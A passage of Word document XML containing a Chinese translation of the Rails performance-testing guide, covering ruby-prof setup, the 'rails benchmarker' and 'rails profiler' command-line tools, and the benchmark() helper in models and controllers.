        <w:t>从此你就可以使用这些便捷的别名了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C95411" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7.2.5 </w:t>
      </w:r>
      <w:r>
        <w:t>安装</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> RubyGems </w:t>
      </w:r>
      <w:r>
        <w:t>（只有</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 1.8 </w:t>
      </w:r>
      <w:r>
        <w:t>需要！）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AAFBB3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">在这里 下载 "RubyGems"http://rubyforge.org/projects/rubygems 的源码并安装。RubyGems 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>README</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 文件是一份很有用的安装手册。注意，如果你用的是1.9版本的 Ruby ，那么这步骤是没有必要的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0886CE9C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.8 基於 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MRI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>REE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的 Ruby-Prof</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B0DC36" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>如果你想要用上 benchmark 测试 或者 profile 测试，先在你的应用程序中的 Gemfile 中加上 Ruby-Prof.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6404"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="34CB830C" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39FCDD88" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="503975950"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem 'ruby-prof', :git</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '</w:t>
            </w:r>
            <w:hyperlink r:id="rId832" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>git://github.com/wycats/ruby-prof.git</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E6F38A0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">然后运行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bundle install</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 就搞定了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDC4717" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 命令行工具</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="1F7F12E9" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CA005AA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Usage: rails benchmarker 'Ruby.code' 'Ruby.more_code' ... [OPTS]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42060919" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -r, --runs N                     Number of runs.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C97E2B7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: 4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69E17021" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -o, --output PATH                Directory to use when writing the results.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08978054" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: tmp/performance</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3722BDEE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -m, --metrics a,b,c              Metrics to use.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ADD1BC4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: wall_time,memory,objects,gc_runs,gc_time</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69052CEA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>示例：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="353B6938" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0698F6A9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="39866920"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails benchmarker 'Item.all' 'CouchItem.all' --runs 3 --metrics wall_time,memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4340492F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>profiler</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6A7FF0FB" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="144460A0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Usage: rails profiler 'Ruby.code' 'Ruby.more_code' ... [OPTS]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E3B97B8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -r, --runs N                     Number of runs.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F382D28" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59294407" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -o, --output PATH                Directory to use when writing the results.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F239AFC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: tmp/performance</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33FD723D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        --metrics a,b,c              Metrics to use.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D146CF2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: process_time,memory,objects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33A45123" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    -m, --formats x,y,z              Formats to output to.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41C981A8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                                     Default: flat,graph_html,call_tree</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="494CBD0D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>示例：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="5AAABA70" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FFD7CD5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="1750617804"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails profiler 'Item.all' 'CouchItem.all' --runs 2 --metrics process_time --formats flat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="62BF4A54" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Metrics 和 formats 选项的行为会因为不同的解释器而不同。你最好对每一个指令都加一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>--help</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 参数去看看。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F936B14" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Helper 方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357FD40E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails 在 Active Record ，Action Controller 和 Action View 中提供了不同的计算代码片段运行时间的 Helper 方法。不过在这三个模块中的方法的名字都一样，叫做 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>benchmark()</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F6E53F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Model</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5568"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="659470CF" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31C5524B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Project.benchmark("Creating project") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79F2C7C2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  project = Project.create("name"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "stuff")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71E64660" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  project.create_manager("name"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "David")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A26B61B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  project.milestones &lt;&lt; Milestone.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A24EC92" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0AB891E4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这其中一段被 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Project.benchmark("Creating project") do...end</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 包住的代码将会被测试，并且测试结果将会被记录到 log 文件中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="4B40F592" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65C17F63" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="1548712895"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Creating project (185.3ms)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1619BE81" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以到 </w:t>
      </w:r>
      <w:hyperlink r:id="rId833" w:anchor="M001336" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> 文档</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 获取更多关于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>benchmark()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AE13E1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553DA7B5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">同样地，你可以在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId834" w:anchor="M000715" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>controllers</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 当中运行这个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>benchmark</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 测试的方法.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="2D4A3825" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3957A618" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>process_projects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="728BAA4D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  self.class.benchmark("Processing projects") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73114607" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Project.process(params[:project_ids])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78B876B2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Project.update_cached_projects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57AE8A1E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DF579B0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1358A9CD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>benchmark</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 在 controller 中是一个类方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B76E674" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
